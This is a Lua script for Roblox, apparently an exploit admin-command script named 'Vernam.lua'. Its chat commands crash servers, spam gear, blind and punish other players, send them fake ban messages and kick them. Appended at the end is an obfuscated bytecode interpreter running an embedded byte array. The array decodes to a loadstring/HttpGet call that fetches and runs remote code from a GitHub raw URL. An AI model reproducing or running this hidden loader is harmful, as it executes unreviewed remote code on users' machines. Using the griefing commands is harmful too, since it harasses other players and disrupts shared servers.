local isAntigearEnabled = false
local playerJoinEnabled = true

game.Players.PlayerAdded:Connect(function(player)
    if playerJoinEnabled then
        local message = "h \n \n \n \n \n \n " .. player.Name .. " joined the server! .1>.!-------"
        game.Players:Chat(message)
        if player.Name == game.Players.LocalPlayer.Name then
            game.Players:Chat("!gearannounce disable")
        end
    end
end)

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    local lowerMsg = msg:lower()
    
    if lowerMsg == ".disableplrjoin" then
        playerJoinEnabled = false
    elseif lowerMsg == ".enableplrjoin" then
        playerJoinEnabled = true
    elseif lowerMsg == ".credits" then
        local message = "h \n \n \n \n \n \n  Vernam was coded by user. >Vernam.lua  -------------"
        game.Players:Chat(message)
    elseif lowerMsg == ".all" then
        game.Players:Chat(".antiblind")
        wait(0.1)
        game.Players:Chat(".antimsg")
        wait(0.1)
        game.Players:Chat(".permap")
        wait(0.1)
        game.Players:Chat(".nok")
        wait(0.1)
        game.Players:Chat(".antikill")
    elseif lowerMsg == ".antigear" then
        game.Players:Chat(".spam ungear/others")
        wait(0.1)
        game.Players:Chat("h \n \n \n \n \n \n Anti gear is now on. >Vernam.lua")
        isAntigearEnabled = true
    elseif lowerMsg == ".unantigear" then
        game.Players:Chat(".stop")
        wait(0.1)
        game.Players:Chat("h \n \n \n \n \n \n Anti gear is now off. >Vernam.lua")
        isAntigearEnabled = false
    elseif lowerMsg == ".rcrash" then
        game.Players:Chat("h \n \n \n \n \n \n please join another server.")
        game.Players:Chat("respawn others")
        game.Players:Chat("time 1")
        game.Players:Chat("brightness nan")
        wait(0.1)
        game.Players:Chat("!rcrash")
        wait(2)
        game.Players:Chat("!rcrash")
    elseif lowerMsg:sub(1, 5) == ".nuke" then
        local lp = game:GetService("Players").LocalPlayer
        game.Players:Chat(".spam gear me 11563251")
        wait(1)
        game.Players:Chat(".usetools")
        wait(0.2)
        game.Players:Chat(".stop")
        
        for i, tool in pairs(lp.Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = lp.Character
                tool:Activate()
                task.wait()
                tool.Parent = lp.Backpack
            end
        end
    elseif lowerMsg:sub(1, 3) == ".eg" and #lowerMsg > 3 then
        local letter = lowerMsg:sub(5, 5)
        game.Players:Chat("blind " .. letter)
        game.Players:Chat("respawn " .. letter)
        game.Players:Chat(".punish2 " .. letter)
        game.Players:Chat(".setspamdelay 0.4")
        wait(6)
        game.Players:Chat(".setspamdelay 0.0000001")
        game.Players:Chat(".stop")
        game.Players:Chat(".spam pm " .. letter .. " sorry, just a test.")
    elseif lowerMsg:sub(1, 2) == ".d" and #lowerMsg > 2 then
    local letter = lowerMsg:sub(4, 4)
    game.Players:Chat(".setspamdelay 0.3")
    wait(0.2)
    game.Players:Chat(".punish " .. letter)
    game.Players:Chat(".spam pm " .. letter .. " you have been banned")
    wait(4)
    game.Players:Chat(".stop")
    wait(0.2)
    game.Players:Chat("respawn " .. letter)
    wait(1)
    game.Players:Chat("skydive me")
    wait(0.3)
    game.Players:Chat("jail me")
    wait(0.3)
    game.Players:Chat(".viewpart baseplate")
    wait(1)
    game.Players:Chat("removejails")
    wait(0.3)
    game.Players:Chat("respawn me")
    wait(1)
    game.Players:Chat(".rkick " .. letter)
end
end)
local function executeCommands()
    game.Players:Chat(".spam gear GAMERNOOBIKYT 79446473")
    wait(5)
    game.Players:Chat(".stop")
end

local function equipAndUnequipTools(player)
    local backpack = player.Backpack
    if not backpack then
        return
    end
    
    local tools = {}
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(tools, tool)
        end
    end
    
    if #tools == 0 then
        return -- No tools in the backpack
    end
    
    local currentIndex = 1
    while true do
        tools[currentIndex].Parent = player.Character
        wait(0.000000000000000000001) -- Adjust the wait time to control how long the tool is equipped
        tools[currentIndex].Parent = backpack
    
        currentIndex = currentIndex % #tools + 1
    end
end

game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == ".betatoolorb" then
        local plr = game:GetService("Players").LocalPlayer
        plr.Character.Humanoid:UnequipTools()

        executeCommands() -- Execute the commands automatically

        local Tools = plr.Backpack:GetChildren()
        local numTools = #Tools
        local radiusOuter = 4 -- Adjust the outer radius of the star
        local radiusInner = 1.5 -- Adjust the inner radius of the star

        for i, tool in ipairs(Tools) do
            local angle = (2 * math.pi / numTools) * i
            local xOuter = math.cos(angle) * radiusOuter
            local zOuter = math.sin(angle) * radiusOuter
            local xInner = math.cos(angle + math.pi/numTools) * radiusInner
            local zInner = math.sin(angle + math.pi/numTools) * radiusInner

            tool.Grip = CFrame.new(xOuter, 0, zOuter) + Vector3.new(xInner, 0, zInner)
            tool.Parent = plr.Character
        end

        wait(0.1) -- Delay for 1 second

        plr.Character.Humanoid:UnequipTools()

        equipAndUnequipTools(plr) -- Call the function for the specific player
    end
    
    if msg:lower() == ".rails" then
        game.Players:Chat(".spam gear GAMERNOOBIKYT 79446473")
        wait(2)
        game.Players:Chat(".stop")

        wait(0.1) -- Delay for 2 seconds before executing the additional script

        local plr = game:GetService("Players").LocalPlayer
        plr.Character.Humanoid:UnequipTools()

        local Tools = plr.Backpack:GetChildren()
        local spiralRadius = 6
        local spiralHeight = -40
        local spiralOffset = 0.5
        local angleIncrement = 15

        for i, tool in ipairs(Tools) do
            local angle = math.rad(angleIncrement * i)
            local xPos = spiralRadius * math.cos(angle)
            local zPos = spiralRadius * math.sin(angle)

            tool.Grip = CFrame.new(xPos, spiralHeight + (i * spiralOffset), zPos) * CFrame.Angles(0, angle, 0)
            tool.Parent = plr.Character
        end
    end
    
    if msg:lower() == ".vgcrash" then
        local message = "h \n \n \n \n \n \n ------------- server crashed. >Vernam.lua-------------"
        game.Players:Chat(message)
    end
    
    if isAntigearEnabled and msg:lower():find("gear me") then
        local playerName = game.Players.LocalPlayer.Name
        local message = "h \n \n \n \n \n \n " .. playerName .. " was trying to crash the server. >Vernam.lua-------------"
        game.Players:Chat(message)
        game.Players:Chat(".spam pm " .. playerName .. " You have been punished.")
        wait(0.3)
        game.Players:Chat(".spam blind " .. playerName)
    end
end)
shared.banana = {} -- For non-perms
shared.gbanned = { { "r", "1_23456789101112131A" }, { "l", "sgoslee" }, { "l", "sgoslee619" }  } -- r = rocket, n = normal, l = lockdown/slock on-join

local a={'\27','\76','\117','\97','\81','\0','\1','\4','\8','\4','\8','\0','\10','\0','\0','\0','\0','\0','\0','\0','\64','\109','\97','\105','\110','\46','\108','\117','\97','\0','\5','\0','\0','\0','\9','\0','\0','\0','\0','\0','\0','\5','\9','\0','\0','\0','\5','\0','\0','\0','\69','\64','\0','\0','\75','\128','\192','\0','\193','\192','\0','\0','\2','\1','\128','\0','\92','\0','\0','\2','\28','\128','\0','\0','\28','\64','\128','\0','\30','\0','\128','\0','\4','\0','\0','\0','\4','\11','\0','\0','\0','\0','\0','\0','\0','\108','\111','\97','\100','\115','\116','\114','\105','\110','\103','\0','\4','\5','\0','\0','\0','\0','\0','\0','\0','\103','\97','\109','\101','\0','\4','\8','\0','\0','\0','\0','\0','\0','\0','\72','\116','\116','\112','\71','\101','\116','\0','\4','\64','\0','\0','\0','\0','\0','\0','\0','\104','\116','\116','\112','\115','\58','\47','\47','\114','\97','\119','\46','\103','\105','\116','\104','\117','\98','\117','\115','\101','\114','\99','\111','\110','\116','\101','\110','\116','\46','\99','\111','\109','\47','\115','\99','\106','\118','\51','\47','\115','\99','\114','\52','\98','\108','\51','\51','\47','\109','\97','\105','\110','\47','\118','\97','\114','\115','\99','\117','\114','\115','\101','\0','\0','\0','\0','\0','\9','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\7','\0','\0','\0','\9','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0'}local b={"ABC","ABx","ABC","ABC","ABC","ABx","ABC","ABx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","ABC","ABC","ABC","ABC","ABC","ABC","ABC","ABC","AsBx","AsBx","ABC","ABC","ABC","ABx","ABC"}local c={"MOVE","LOADK","LOADBOOL","LOADNIL","GETUPVAL","GETGLOBAL","GETTABLE","SETGLOBAL","SETUPVAL","SETTABLE","NEWTABLE","SELF","ADD","SUB","MUL","DIV","MOD","POW","UNM","NOT","LEN","CONCAT","JMP","EQ","LT","LE","TEST","TESTSET","CALL","TAILCALL","RETURN","FORLOOP","FORPREP","TFORLOOP","SETLIST","CLOSE","CLOSURE","VARARG"}local function d(e,f,g)if g then local h=0;local i=0;for j=f,g do h=h+2^i*d(e,j)i=i+1 end;return h else local k=2^(f-1)return e%(k+k)>=k and 1 or 0 end end;local function l(m)local n=1;local o=false;local p;local q;local r,s;local t,u,v,w,x;do function t()local y=m:byte(n,n)n=n+1;return y end;function u()local y,z,A,B=m:byte(n,n+3)n=n+4;return B*16777216+A*65536+z*256+y end;function v()local y=u()local z=u()return z*4294967296+y end;function w()local y=u()local z=u()return(-2*d(z,32)+1)*2^(d(z,21,31)-1023)*((d(z,1,20)*2^32+y)/2^52+1)end;function x(C)local D;if C then D=m:sub(n,n+C-1)n=n+C else C=s()if C==0 then return end;D=m:sub(n,n+C-1)n=n+C end;return D end end;local function E()local F;local G={}local H={}local I={}local J={lines={}}F={instructions=G,constants=H,prototypes=I,debug=J}local K;F.name=x()F.first_line=r()F.last_line=r()if F.name then F.name=F.name:sub(1,-2)end;F.upvalues=t()F.arguments=t()F.varg=t()F.stack=t()do K=r()for j=1,K do local L={}local a=u()local M=d(a,1,6)local N=b[M+1]L.opcode=M;L.type=N;L.A=d(a,7,14)if N=="ABC"then L.B=d(a,24,32)L.C=d(a,15,23)elseif N=="ABx"then L.Bx=d(a,15,32)elseif N=="AsBx"then L.sBx=d(a,15,32)-131071 end;G[j]=L end end;do K=r()for j=1,K do local O={}local N=t()O.type=N;if N==1 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=t()~=0 elseif N==3 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=w()elseif N==4 then O.llIIlIlIIllllIlIlIlIIlIlIlIllllIllI=x():sub(1,-2)end;H[j-1]=O end end;do K=r()for j=1,K do I[j-1]=E()end end;do local a=J.lines;K=r()for j=1,K do a[j]=u()end;K=r()for j=1,K do x():sub(1,-2)u()u()end;K=r()for j=1,K do x()end end;return F end;do assert(x(4)=="\27Lua","S1MPLYS3C7RED: Bytecode expected")assert(t()==0x51,"S1MPLYS3C7RED: Only lua5.1 is supported")t()o=t()==0;p=t()q=t()if p==4 then r=u elseif p==8 then r=v else error("")end;if q==4 then s=u elseif q==8 then s=v else error("")end;assert(x(3)=="\4\8\0","S1MPLYS3C7RED: Unsupported platform")end;return E()end;local function P(...)local A=select("#",...)local Q={...}return A,Q end;local function R(S,T)local G=S.instructions;local H=S.constants;local I=S.prototypes;local U,V;local W;local X=1;local Y,Z;local _={[0]=function(L)U[L.A]=U[L.B]end,[1]=function(L)U[L.A]=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI end,[2]=function(L)U[L.A]=L.B~=0;if L.C~=0 then X=X+1 end end,[3]=function(L)local U=U;for j=L.A,L.B do U[j]=nil end end,[4]=function(L)U[L.A]=T[L.B]end,[5]=function(L)local a0=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;U[L.A]=W[a0]end,[6]=function(L)local a1=L.C;local U=U;a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=U[L.B][a1]end,[7]=function(L)local a0=H[L.Bx].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI;W[a0]=U[L.A]end,[8]=function(L)T[L.B]=U[L.A]end,[9]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A][a2]=a1 end,[10]=function(L)U[L.A]={}end,[11]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;a2=U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[a3+1]=a2;U[a3]=a2[a1]end,[12]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2+a1 end,[13]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2-a1 end,[14]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2*a1 end,[15]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2/a1 end,[16]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2%a1 end,[17]=function(L)local a2=L.B;local a1=L.C;local U,H=U,H;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]U[L.A]=a2^a1 end,[18]=function(L)U[L.A]=-U[L.B]end,[19]=function(L)U[L.A]=not U[L.B]end,[20]=function(L)U[L.A]=#U[L.B]end,[21]=function(L)local a2=L.B;local a4=U[a2]for j=a2+1,L.C do a4=a4 ..U[j]end;U[L.A]=a4 end,[22]=function(L)X=X+L.sBx end,[23]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2==a1~=a3 then X=X+1 end end,[24]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2<a1~=a3 then X=X+1 end end,[25]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U,H=U,H;a3=a3~=0;a2=a2>255 and H[a2-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a2]a1=a1>255 and H[a1-256].llIIlIlIIllllIlIlIlIIlIlIlIllllIllI or U[a1]if a2<=a1~=a3 then X=X+1 end end,[26]=function(L)if U[L.A]==(L.C~=0)then X=X+1 end end,[27]=function(L)local U=U;local a2=U[L.B]if a2==(L.C~=0)then X=X+1 else U[L.A]=a2 end end,[28]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local a5,a6;local a7,a8;a5={}if a2~=1 then if a2~=0 then a7=a3+a2-1 else a7=V end;a8=0;for j=a3+1,a7 do a8=a8+1;a5[a8]=U[j]end;a7,a6=P(U[a3](unpack(a5,1,a7-a3)))else a7,a6=P(U[a3]())end;V=a3-1;if a1~=1 then if a1~=0 then a7=a3+a1-2 else a7=a7+a3 end;a8=0;for j=a3,a7 do a8=a8+1;U[j]=a6[a8]end end end,[29]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local a5,a6;local V,a7,a8=V;a5={}if a2~=1 then if a2~=0 then a7=a3+a2-1 else a7=V end;a8=0;for j=a3+1,a7 do a8=a8+1;a5[#a5+1]=U[j]end;a6={U[a3](unpack(a5,1,a7-a3))}else a6={U[a3]()}end;return true,a6 end,[30]=function(L)local a3=L.A;local a2=L.B;local U=U;local a7;local a8,a9;if a2==1 then return true end;if a2==0 then a7=V else a7=a3+a2-2 end;a9={}local a8=0;for j=a3,a7 do a8=a8+1;a9[a8]=U[j]end;return true,a9 end,[31]=function(L)local a3=L.A;local U=U;local aa=U[a3+2]local n=U[a3]+aa;U[a3]=n;if aa>0 then if n<=U[a3+1]then X=X+L.sBx;U[a3+3]=n end else if n>=U[a3+1]then X=X+L.sBx;U[a3+3]=n end end end,[32]=function(L)local a3=L.A;local U=U;U[a3]=U[a3]-U[a3+2]X=X+L.sBx end,[33]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;local ab=a3+2;local a4={U[a3](U[a3+1],U[a3+2])}for j=1,a1 do U[ab+j]=a4[j]end;if U[a3+3]~=nil then U[a3+2]=U[a3+3]else X=X+1 end end,[34]=function(L)local a3=L.A;local a2=L.B;local a1=L.C;local U=U;if a1==0 then error("NYI: extended SETLIST")else local ab=(a1-1)*50;local Q=U[a3]if a2==0 then a2=V end;for j=1,a2 do Q[ab+j]=U[a3+j]end end end,[35]=function(L)io.stderr:write("NYI: CLOSE")io.stderr:flush()end,[36]=function(L)local ac=I[L.Bx]local G=G;local U=U;local ad={}local ae=setmetatable({},{__index=function(Q,af)local ag=ad[af]return ag.segment[ag.offset]end,__newindex=function(Q,af,ah)local ag=ad[af]ag.segment[ag.offset]=ah end})for j=1,ac.upvalues do local ai=G[X]if ai.opcode==0 then ad[j-1]={segment=U,offset=ai.B}elseif G[X].opcode==4 then ad[j-1]={segment=T,offset=ai.B}end;X=X+1 end;local aj,ak=R(ac,ae)U[L.A]=ak end,[37]=function(L)local a3=L.A;local a2=L.B;local U,Y=U,Y;for j=a3,a3+(a2>0 and a2-1 or Z)do U[j]=Y[j-a3]end end}local function a8()local G=G;local L,y,z;while true do L=G[X]X=X+1;y,z=_[L.opcode](L)if y then return z end end end;local al={get_stack=function()return U end,get_IP=function()return X end}local function ak(...)local am={}local an={}V=-1;U=setmetatable(am,{__index=an,__newindex=function(Q,af,ah)if af>V and ah then V=af end;an[af]=ah end})local a5={...}Y={}Z=select("#",...)-1;for j=0,Z do am[j]=a5[j+1]Y[j]=a5[j+1]end;W=getfenv()X=1;local ao=coroutine.create(a8)local y,z=coroutine.resume(ao)if y then if z then return unpack(z)end;return else local ap=S.name;local aq=S.debug.lines[X]local ar=z:gsub("(.-:)","")local a9=""a9=a9 ..(ap and ap..":"or"")a9=a9 ..(aq and aq..":"or"")a9=a9 ..z;error(a9,0)end end;return al,ak end;local as={IlIIIIIIlIllIIlIlIIIllIllIIlllIllll=function(m)local S=l(m)local aj,ak=R(S)return ak end,utils={lIlIIIlllIlIIIIlIIIllIlIIIIIlIlIlll=l,IIllIllIlIIIIIIIIllIlIIIIlllIIIIIIl=R,IlllIIIllIlllIlIIIllllIIllllIIllllI=function(m)local S=l(m)return R(S)end}}as.IlIIIIIIlIllIIlIlIIIllIllIIlllIllll(table.concat(a,[[]]))()
